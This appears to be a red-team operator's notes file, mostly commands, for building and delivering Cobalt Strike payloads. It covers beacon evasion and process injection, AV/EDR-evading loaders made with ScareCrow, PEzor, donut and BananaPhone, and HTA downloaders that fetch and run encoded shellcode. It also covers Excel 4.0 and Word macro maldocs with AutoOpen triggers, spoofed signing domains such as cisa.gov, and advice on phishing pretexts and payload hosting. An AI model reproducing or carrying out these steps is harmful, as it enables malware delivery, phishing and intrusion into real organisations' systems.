
# Payloads
##########################

=====  Beacon Initial Actions  =====
	## Disable event thread tracing for windows
etw stop
	## Migrate to a process that commonly interacts with the network such as explorer.exe or svchost.exe
ps
ppid <pid>
	## To revert back to original PID, aka: set parent process as current process
ppid

	## Spawn a new beacon within a running process
		## Spawn beacons for each team member
		## Spawn beacon for lifeline
	## Spawn using static syscalls
static_syscalls_inject <pid> <cs listener>
	## Spawn new beacons with DLLs
shell c:\windows\system32\regsvr32.exe c:\windows\tasks\cisa12345.dll

	## Add labels to beacon
note <operator name>
	## Enumerate
netLocalGroupListMembers administrators
	## Elevate privileges: https://github.com/rsmudge/ElevateKit/tree/master/modules


=====  Payload Creation  =====
# Cobalt Strike:
	## Attacks > Packages > Windows Executable (S)
		## Listener: https-beacon, Output: Raw, x64: unchecked
			## Save as x86_raw.bin
	## Attacks > Packages > Windows Executable (S)
		## Listener: https-beacon, Output: Raw, x64: checked
			## Save as x64_raw.bin
	## Attacks > Packages > Windows Executable (S)
		## Listener: https-beacon, Output: Windows EXE, x64: checked
			## Save as x64.exe

# HTA TikiTorch https://github.com/rasta-mouse/TikiTorch
	## !! Only supports x86
	## base64 the x86 CobaltStrike shellcode
base64 -w0 /root/payloads/x86_raw.bin > /root/payloads/x86_raw_bin.b64
	## Insert into tiki_blank.hta template
		## Manual copy/paste:
xclip -selection clipboard < <file/to/copy/to/clipboard>
subl /root/payloads/tiki_blank.hta
		## Replace the "insert base64 payload here" string with b64 output, keep the quotes
		## Let bash help:
awk 'FNR==NR{s=(!s)?$0:s RS $0;next} /insert base64 payload here/{sub(/insert encrypted payload here/, s)} 1' /root/payloads/x86_raw_bin.b64 /root/payloads/tiki_blank.hta > /root/payloads/tki.hta

# HTA CACTUSTORCH https://github.com/mdsecactivebreach/CACTUSTORCH
	## More reading on CactusTorch: https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/
	## !! Only supports x86
	## base64 the x86 CobaltStrike shellcode
base64 -w0 /root/payloads/x86_raw.bin > /root/payloads/x86_raw_bin.b64
	## Insert b64 output into the "cs" variable in cactustorch-template.hta
		## Manual copy/paste:
xclip -selection clipboard < <file/to/copy/to/clipboard>
subl /root/payloads
		## Let bash help:
awk 'FNR==NR{s=(!s)?$0:s RS $0;next} /insert base64 payload here/{sub(/insert base64 payload here/, s)} 1' /root/payloads/x86_raw_bin.b64 /root/payloads/cactus_blank.hta > /root/payloads/cactus.hta

# EXE Scarecrow https://github.com/optiv/ScareCrow
	## !! Only supports x64
	## Install dependencies:
cd /root/tools
git clone https://github.com/optiv/ScareCrow.git
cd ScareCrow
go get && go build
	## !! If dependencies are missing, try:
apt install -y openssl osslsigncode mingw-w64
	## Run scarecrow:
/root/tools/ScareCrow/ScareCrow -I /root/payloads/x64_raw.bin -Loader binary -domain microsoft.com
	## !! Output will be in the ScareCrow directory, named after a Windows binary such as OneDrive.exe or cmd.exe

# JS Scarecrow https://github.com/optiv/ScareCrow
/root/tools/ScareCrow/ScareCrow -I /root/payloads/x64_raw.bin -Loader control -O scarecrow.js -domain microsoft.com
	## Convert to text (move payload to Commando VM)
certutil -encode payload.exe cisa.txt
	## Move back to Kali
	## find/replace all occurrences of cisa in exe-downloader.hta template
	## Replace phishing domain
	## Replace exe and txt file names
		## Make sure exe is changed to js where appropriate
	## Create web link for exe-downloader.hta and cisa.txt in CobaltStrike
		## Target runs exe-downloader.hta, which downloads, converts, and executes cisa.txt

# EXE ScareCrow Donut Banana
	## donut https://github.com/TheWover/donut
	## More reading on donut: https://thewover.github.io/Introducing-Donut/
cd /root/tools/donut
make
/root/tools/donut/donut -a 2 -f 7 -o /root/payloads/donut_payload <name_of_scarecrow.exe>

# BananaPhone https://github.com/C-Sto/BananaPhone
git clone https://github.com/C-Sto/BananaPhone /root/tools/BananaPhone
cd /root/tools/BananaPhone
go get https://github.com/c-sto/bananaphone
cd /root/tools/BananaPhone/example/hideexample/banana/
subl /root/payloads/donut_payload
	## Copy main.go code from bananaphone directory into the donut_payload file
	## !! Add a comma to the end of the donut_payload byte code if it isn't there already
	## !! The donut_payload file can be very large, so copying and pasting banana's code into the donut_payload is more resource efficient
	## Build with inside of that directory
env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui

# EXE Banana
	## BananaPhone https://github.com/C-Sto/
git clone https://github.com/C-Sto/BananaPhone /root/tools/BananaPhone
cd /root/tools/BananaPhone
go get github.com/c-sto/bananaphone
cd /root/tools/BananaPhone/example/hideexample/banana/
subl /root/payloads/x64_raw.bin
	## Copy main.go code from bananaphone directory into the x64_raw.bin file
	## !! Add a comma to the end of the donut_payload byte code if it isn't there already
	## !! The donut_payload file can be very large, so copying and pasting banana's code into the donut_payload is more resource efficient
	## Build with inside of that directory
env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui

# EXE PEzor https://github.com/phra/PEzor
git clone https://github.com/phra/PEzor.git /root/tools/PEzor
cd PEzor
./install.sh
	## Run PATH EXPORT command at the end of the installation process
sed -i -e 's/-strip-all -Wall -pedantic/-subsystem,windows/' /root/tools/PEzor/PEzor.sh
	## Use Cobalt strike x86 or x64 bin (Packages > Windows Exectable (S) > raw)
		## Add "-32" flag for x86 payloads
	## PEzor exe
./PEzor.sh -sgn -unhook -antidebug -text -self -shellcode /root/payloads/x64_raw.bin
	## PEzor .NET exe
./PEzor.sh -format=dotnet-pinvoke -sgn -unhook -antidebug -shellcode /root/payloads/x64_raw.bin
	## PEzor reflective dll
./PEzor.sh -format=reflective-dll /root/payloads/x64_raw.bin

# XLS MACRO Macrome https://github.com/michaelweber/Macrome
git clone https://github.com/michaelweber/Macrome.git
	## Create an Excel spreadsheet (must be XLS Excel 2003 format, not XLSX)
	## !! Add convincing pretext to keep target engaged; the beacon will die if the document is closed!
	## Build Macrome in Visual Studio
	## Build payload
dotnet Macrome.dll b --decoy-document C:\payloads\book1.xls --payload C:\payloads\x86-https.bin --payload64-bit C:\payloads\x64-https.bin --method AntiAnalysisCharSubroutine --payload-method base64 --password VelvetSweatshop --output-file-name macrome.xls
	## Output will go to the Macrome\bin\Debug\net5.0 folder



-----  Delivering payloads  -----
# Create web link to payload in Cobalt Strike webserver
	## Click on the "Host a file" icon (looks like a chain link, 4th icon from the end) or go to Attacks > Web Drive-by > Host File
	## Select file, rename Local URI, change Local Host to a domain name if possible, change Local Port to 443 and check Enable SSL if SSL is available. Launch.
	## !! Always use domain names, never use IPs when serving resources through Cobalt Strike

##########################
# Notes
##########################

./ScareCrow -I /mnt/share/Working/dylan/scarecrow-dns.bin -domain cisa.gov -sandbox -etw -Loader wscript -delivery macro -url https://straxotechnology.com -O 16-https-scarecrow-wscript.js

    change line with Environ to Environ("TEMP") & "\"

    or some other path that exists

    then add at bottom

    Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub


	> XLS MACRO boobsnail https://github.com/STMSolutions/boobsnail
		- git clone https://github.com/STMSolutions/boobsnail.git
		- python3 boobsnail.py Excel4NtDonutGenerator --inputx86 /root/payloads/x86_raw.bin --inputx64 /root/payloads/x64_raw.bin --out /root/payloads/boobsnail.csv

	> JS DotNetToJScript https://github.com/tyranid/DotNetToJScript
		- git clone https://github.com/tyranid/DotNetToJScript
		> Build sln
	> DotNetToJScript https://github.com/tyranid/DotNetToJScript
		> git clone https://github.com/tyranid/DotNetToJScript.git C:\Tools\
		> C:\Program Files (x86)\MSBuild\14.0\Bin\MSBuild.exe C:\Tools\DotNetToJScript\DotNetToJScript.sln /property:Configuration=Release

The Excelntdonut payload is a bit of a process
EXCELntDonut -f CsharpFile.cs -o macrofile.txt

The CSharp file needs to be full fledged code that executes the Cobalt Strike shellcode (will post example on share)

Next, you take the macrofile.txt or whatever you name it and copy it all.

Open a new excel document up, right click on bottom header/sheet and insert excel 4.0 macro. Copy and past into A1 the contexts of macrofile.txt.

Go to data tab with everything highlighted and then "Text to columns", select delimited and give it a semicolon and click finish. The macro should now be in 3 columns.

Edit A1 to "Auto_Open", save as excel 97 .xls file (can also hide the macro sheet if you want) and should be good to go





Remote template - Word Macro ( I think John has some stuff posted in that penetration test tips document)

-I follow what fortynorthsecurity wrote below

https://fortynorthsecurity.com/blog/maldoc-fu-some-ideas-for-malicious-document-delivery/

-For execution I use the ControlPanelItem method from below with a scarecrow or bananaphone exe that the macro first downloads to disk

https://www.certego.net/en/news/advanced-vba-macros/